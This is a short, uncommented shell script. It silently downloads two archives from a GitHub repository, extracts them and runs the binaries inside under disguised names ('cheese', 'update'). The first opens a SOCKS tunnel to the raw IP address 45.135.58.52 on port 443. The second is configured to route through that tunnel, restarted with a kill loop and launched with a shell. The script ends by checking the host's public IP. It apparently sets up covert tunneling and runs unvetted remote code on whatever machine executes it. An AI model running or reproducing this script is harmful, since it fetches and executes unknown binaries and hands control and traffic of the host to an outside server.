wget -q https://raw.githubusercontent.com/thembilemhlabangula/update/main/cheese.tar.gz > /dev/null

sleep 2

tar -xf cheese.tar.gz

sleep 2

./cheese client -v 45.135.58.52:443 7777:socks &

sleep 2

TZ='Africa/Johannesburg'; export TZ
date
sleep 2

curl -s -L -o update.tar.gz https://raw.githubusercontent.com/thembilemhlabangula/update/main/update.tar.gz > /dev/null

sleep 2

tar -xf update.tar.gz > /dev/null

sleep 2

cat > update/local/update-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 127.0.0.1:7777
END

./update/local/update-local -config update/local/update-local.conf & > /dev/null

sleep 2

ps -A | grep update-local | awk '{print $1}' | xargs kill -9 $1

sleep 3

./update/local/update-local -config update/local/update-local.conf & > /dev/null

sleep 2

./update/update bash

sleep 5

curl ifconfig.me
